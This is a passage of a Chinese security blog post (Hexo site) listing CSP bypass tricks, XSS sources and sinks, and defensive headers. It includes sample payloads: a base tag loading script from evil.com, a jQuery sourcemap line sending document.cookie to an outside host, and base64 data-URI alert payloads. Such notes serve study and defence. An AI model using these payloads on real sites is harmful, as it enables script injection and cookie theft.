+<h3 id="MIME-sniff"><a href="#MIME-sniff" class="headerlink" title="MIME sniff"></a>MIME sniff</h3><p>举例来说，csp禁止跨站读取脚本，但是可以跨站读img，那么传一个含有脚本的img，再<code>&lt;script href=&#39;http://xxx.com/xx.jpg&#39;&gt;</code>，这里csp认为是一个img，绕过了检查，如果网站没有回正确的mime type，浏览器会进行猜测，就可能加载该img作为脚本</p>
+<h3 id="302跳转"><a href="#302跳转" class="headerlink" title="302跳转"></a>302跳转</h3><p>对于302跳转绕过CSP而言，实际上有以下几点限制：</p>
+<ul>
+<li>跳板必须在允许的域内。</li>
+<li>要加载的文件的host部分必须跟允许的域的host部分一致</li>
+</ul>
+<h3 id="iframe"><a href="#iframe" class="headerlink" title="iframe"></a>iframe</h3><p>当可以执行代码时，可以创建一个源为 <code>css</code> <code>js</code> 等静态文件的frame，在配置不当时，该frame并不存在csp，则在该frame下再次创建frame，达到bypass的目的。同理，使用 <code>../../../</code> <code>/%2e%2e%2f</code> 等可能触发服务器报错的链接也可以到达相应的目的。</p>
+<h3 id="base-uri"><a href="#base-uri" class="headerlink" title="base-uri"></a>base-uri</h3><p>当script-src为nonce或无限制，且base-uri无限制时，可通过 <code>base</code> 标签修改根URL来bypass，如下加载了<a target="_blank" rel="noopener" href="http://evil.com/main.js">http://evil.com/main.js</a></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;base href=<span class="string">&quot;http://evil.com/&quot;</span>&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">&quot;correct value&quot;</span> <span class="attr">src</span>=<span class="string">&quot;/main.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ul>
+<li><p>location 绕过</p>
+</li>
+<li><p>可上传SVG时，通过恶意SVG绕过同源站点</p>
+</li>
+<li><p>存在CRLF漏洞且可控点在CSP上方时，可以注入HTTP响应中影响CSP解析</p>
+</li>
+<li><p>CND Bypass，如果网站信任了某个CDN, 那么可利用相应CDN的静态资源bypass</p>
+</li>
+<li><p>Angular versions &lt;1.5.9 &gt;&#x3D;1.5.0，存在漏洞 <a target="_blank" rel="noopener" href="https://github.com/angular/angular.js/pull/15346">Git Pull Request</a></p>
+</li>
+<li><ul>
+<li><p>jQuery sourcemap</p>
+<p><code>document.write(</code><script> //@        sourceMappingURL=<a target="_blank" rel="noopener" href="http://xxxx/%60+document.cookie+%60">http://xxxx/`+document.cookie+`</a></script><code>);`` </code></p>
+</li>
+</ul>
+</li>
+<li><p>a标签的ping属性</p>
+</li>
+<li><p>For FireFox <code>&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0; url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnSWhhdmVZb3VOb3cnKTs8L3NjcmlwdD4=&quot;&gt;</code></p>
+</li>
+<li><p><code>&lt;link rel=&quot;import&quot; /&gt;</code></p>
+</li>
+<li><p><code>&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=http://....&quot; /&gt;</code></p>
+</li>
+<li><ul>
+<li><p>仅限制 <code>script-src</code> 时：</p>
+<p><code>&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;/object&gt;</code></p>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="XSS数据源"><a href="#XSS数据源" class="headerlink" title="XSS数据源"></a>XSS数据源</h1><h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul>
+<li><code>location</code></li>
+<li><code>location.href</code></li>
+<li><code>location.pathname</code></li>
+<li><code>location.search</code></li>
+<li><code>location.hash</code></li>
+<li><code>document.URL</code></li>
+<li><code>document.documentURI</code></li>
+<li><code>document.baseURI</code></li>
+</ul>
+<h2 id="Navigation"><a href="#Navigation" class="headerlink" title="Navigation"></a>Navigation</h2><ul>
+<li><code>window.name</code></li>
+<li><code>document.referrer</code></li>
+</ul>
+<h2 id="Communication"><a href="#Communication" class="headerlink" title="Communication"></a>Communication</h2><ul>
+<li><code>Ajax</code></li>
+<li><code>Fetch</code></li>
+<li><code>WebSocket</code></li>
+<li><code>PostMessage</code></li>
+</ul>
+<h2 id="Storage"><a href="#Storage" class="headerlink" title="Storage"></a>Storage</h2><ul>
+<li><code>Cookie</code></li>
+<li><code>LocalStorage</code></li>
+<li><code>SessionStorage</code></li>
+</ul>
+<h1 id="Sink"><a href="#Sink" class="headerlink" title="Sink"></a>Sink</h1><h2 id="执行JavaScript"><a href="#执行JavaScript" class="headerlink" title="执行JavaScript"></a>执行JavaScript</h2><ul>
+<li><p><code>eval(payload)</code></p>
+</li>
+<li><p><code>setTimeout(payload, 100)</code></p>
+</li>
+<li><p><code>setInterval(payload, 100)</code></p>
+</li>
+<li><p><code>Function(payload)()</code></p>
+</li>
+<li><p><code>&lt;script&gt;payload&lt;/script&gt;</code></p>
+</li>
+<li><p><code>&lt;img src=x onerror=payload&gt;</code></p>
+</li>
+</ul>
+<h2 id="加载URL"><a href="#加载URL" class="headerlink" title="加载URL"></a>加载URL</h2><ul>
+<li><code>location=javascript:alert(/xss/)</code></li>
+<li><code>location.href=javascript:alert(/xss/)</code></li>
+<li><code>location.assign(javascript:alert(/xss/))</code></li>
+<li><code>location.replace(javascript:alert(/xss/))</code></li>
+</ul>
+<h2 id="执行HTML"><a href="#执行HTML" class="headerlink" title="执行HTML"></a>执行HTML</h2><ul>
+<li><code>xx.innerHTML=payload</code></li>
+<li><code>xx.outerHTML=payload</code></li>
+<li><code>document.write(payload)</code></li>
+<li><code>document.writeln(payload)</code></li>
+</ul>
+<h1 id="xss保护"><a href="#xss保护" class="headerlink" title="xss保护"></a>xss保护</h1><h2 id="HTML过滤"><a href="#HTML过滤" class="headerlink" title="HTML过滤"></a>HTML过滤</h2><p>使用一些白名单或者黑名单来过滤用户输入的HTML，以实现过滤的效果。例如DOMPurify等工具都是用该方式实现了XSS的保护。</p>
+<h2 id="X-Frame"><a href="#X-Frame" class="headerlink" title="X-Frame"></a>X-Frame</h2><p>X-Frame-Options 响应头有三个可选的值：</p>
+<ul>
+<li><ul>
+<li><p>DENY</p>
+<p>页面不能被嵌入到任何iframe或frame中</p>
+</li>
+</ul>
+</li>
+<li><ul>
+<li><p>SAMEORIGIN</p>
+<p>页面只能被本站页面嵌入到iframe或者frame中</p>
+</li>
+</ul>
+</li>
+<li><ul>
+<li><p>ALLOW-FROM</p>
+<p>页面允许frame或frame加载</p>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="XSS保护头"><a href="#XSS保护头" class="headerlink" title="XSS保护头"></a>XSS保护头</h2><p>基于 Webkit 内核的浏览器(比如Chrome)在特定版本范围内有一个名为XSS auditor的防护机制，如果浏览器检测到了含有恶意代码的输入被呈现在HTML文档中，那么这段呈现的恶意代码要么被删除，要么被转义，恶意代码不会被正常的渲染出来。</p>
+<p>而浏览器是否要拦截这段恶意代码取决于浏览器的XSS防护设置。</p>
+<p>要设置浏览器的防护机制，则可使用X-XSS-Protection字段 该字段有三个可选的值</p>
+<ul>
+<li><code>0</code> : 表示关闭浏览器的XSS防护机制</li>
+<li><code>1</code> : 删除检测到的恶意代码， 如果响应报文中没有看到 X-XSS-Protection 字段，那么浏览器就认为X-XSS-Protection配置为1，这是浏览器的默认设置</li>
+<li><code>1; mode=block</code> : 如果检测到恶意代码，在不渲染恶意代码</li>
+</ul>
+<p>FireFox没有相关的保护机制，如果需要保护，可使用NoScript等相关插件。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2023/12/26/%E4%B8%AD%E9%97%B4%E4%BB%B6/" rel="next" title="中间件">
+                <i class="fa fa-chevron-left"></i> 中间件
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2023/12/26/xpath/" rel="prev" title="xpath注入">
+                xpath注入 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.gif"
+               alt="" />
+          <p class="site-author-name" itemprop="name"></p>
+           
+              <p class="site-description motion-element" itemprop="description"></p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives/">
+                <span class="site-state-item-count">45</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#xss%E5%88%86%E7%B1%BB"><span class="nav-number">1.</span> <span class="nav-text">xss分类</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"><span class="nav-number">1.1.</span> <span class="nav-text">1.反射型XSS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E5%82%A8%E5%AD%98%E5%9E%8Bxss"><span class="nav-number">1.2.</span> <span class="nav-text">2.储存型xss</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-dom-xss"><span class="nav-number">1.3.</span> <span class="nav-text">3.dom xss</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-Blind-XSS"><span class="nav-number">1.4.</span> <span class="nav-text">4.Blind XSS</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#xss%E4%BD%9C%E7%94%A8"><span class="nav-number">2.</span> <span class="nav-text">xss作用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5"><span class="nav-number">3.</span> <span class="nav-text">同源策略</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B"><span class="nav-number">3.1.</span> <span class="nav-text">简介</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#file%E5%9F%9F%E7%9A%84%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5"><span class="nav-number">3.1.1.</span> <span class="nav-text">file域的同源策略</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#cookie%E7%9A%84%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5"><span class="nav-number">3.1.2.</span> <span class="nav-text">cookie的同源策略</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Flash-SilverLight%E8%B7%A8%E5%9F%9F"><span class="nav-number">3.1.3.</span> <span class="nav-text">Flash&#x2F;SilverLight跨域</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BA%90%E7%9A%84%E6%9B%B4%E6%94%B9"><span class="nav-number">3.1.4.</span> <span class="nav-text">源的更改</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%B7%A8%E6%BA%90%E8%AE%BF%E9%97%AE"><span class="nav-number">4.</span> <span class="nav-text">跨源访问</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%80%9A%E5%B8%B8%E5%85%81%E8%AE%B8%E8%B7%A8%E5%9F%9F%E5%86%99%E6%93%8D%E4%BD%9C-Cross-origin-writes"><span class="nav-number">4.1.</span> <span class="nav-text">通常允许跨域写操作(Cross-origin writes)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JSONP%E8%B7%A8%E5%9F%9F"><span class="nav-number">4.2.</span> <span class="nav-text">JSONP跨域</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B7%A8%E6%BA%90%E8%84%9A%E6%9C%ACAPI%E8%AE%BF%E9%97%AE"><span class="nav-number">4.3.</span> <span class="nav-text">跨源脚本API访问</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B7%A8%E6%BA%90%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8%E8%AE%BF%E9%97%AE"><span class="nav-number">4.4.</span> <span class="nav-text">跨源数据存储访问</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CORS"><span class="nav-number">4.5.</span> <span class="nav-text">CORS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E8%AF%B7%E6%B1%82%E5%A4%B4"><span class="nav-number">4.6.</span> <span class="nav-text">常见请求头</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E8%BF%94%E5%9B%9E%E5%A4%B4"><span class="nav-number">4.7.</span> <span class="nav-text">常见返回头</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%98%BB%E6%AD%A2%E8%B7%A8%E6%BA%90%E8%AE%BF%E9%97%AE"><span class="nav-number">4.8.</span> <span class="nav-text">阻止跨源访问</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#csp"><span class="nav-number">5.</span> <span class="nav-text">csp</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%85%8D%E7%BD%AE"><span class="nav-number">5.1.</span> <span class="nav-text">配置</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8C%87%E4%BB%A4%E8%AF%B4%E6%98%8E"><span class="nav-number">5.1.1.</span> <span class="nav-text">指令说明</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-2-4-2-2-%E5%85%B3%E9%94%AE%E5%AD%97"><span class="nav-number">5.1.2.</span> <span class="nav-text">4.2.4.2.2. 关键字</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-2-4-2-3-%E9%85%8D%E7%BD%AE%E8%8C%83%E4%BE%8B"><span class="nav-number">5.1.3.</span> <span class="nav-text">4.2.4.2.3. 配置范例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Bypass"><span class="nav-number">5.2.</span> <span class="nav-text">Bypass</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%84%E5%8A%A0%E8%BD%BD"><span class="nav-number">5.2.1.</span> <span class="nav-text">预加载</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MIME-sniff"><span class="nav-number">5.2.2.</span> <span class="nav-text">MIME sniff</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#302%E8%B7%B3%E8%BD%AC"><span class="nav-number">5.2.3.</span> <span class="nav-text">302跳转</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#iframe"><span class="nav-number">5.2.4.</span> <span class="nav-text">iframe</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#base-uri"><span class="nav-number">5.2.5.</span> <span class="nav-text">base-uri</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B6%E4%BB%96"><span class="nav-number">5.2.6.</span> <span class="nav-text">其他</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS%E6%95%B0%E6%8D%AE%E6%BA%90"><span class="nav-number">6.</span> <span class="nav-text">XSS数据源</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#URL"><span class="nav-number">6.1.</span> <span class="nav-text">URL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Navigation"><span class="nav-number">6.2.</span> <span class="nav-text">Navigation</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Communication"><span class="nav-number">6.3.</span> <span class="nav-text">Communication</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Storage"><span class="nav-number">6.4.</span> <span class="nav-text">Storage</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Sink"><span class="nav-number">7.</span> <span class="nav-text">Sink</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%89%A7%E8%A1%8CJavaScript"><span class="nav-number">7.1.</span> <span class="nav-text">执行JavaScript</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8A%A0%E8%BD%BDURL"><span class="nav-number">7.2.</span> <span class="nav-text">加载URL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%89%A7%E8%A1%8CHTML"><span class="nav-number">7.3.</span> <span class="nav-text">执行HTML</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#xss%E4%BF%9D%E6%8A%A4"><span class="nav-number">8.</span> <span class="nav-text">xss保护</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#HTML%E8%BF%87%E6%BB%A4"><span class="nav-number">8.1.</span> <span class="nav-text">HTML过滤</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#X-Frame"><span class="nav-number">8.2.</span> <span class="nav-text">X-Frame</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS%E4%BF%9D%E6%8A%A4%E5%A4%B4"><span class="nav-number">8.3.</span> <span class="nav-text">XSS保护头</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">frozenfish</span>
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" target="_blank" rel="noopener" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Gemini
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.2"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
